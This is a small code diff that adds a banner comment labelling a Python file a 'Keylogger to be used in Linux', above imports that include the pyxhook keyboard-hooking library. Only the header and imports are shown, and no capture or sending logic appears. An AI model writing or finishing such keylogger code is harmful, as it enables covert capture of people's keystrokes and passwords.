@@ -1,3 +1,7 @@
+#################################
+# Keylogger to be used in Linux #
+#################################
+
 import os
 import pyxhook
 from datetime import datetime
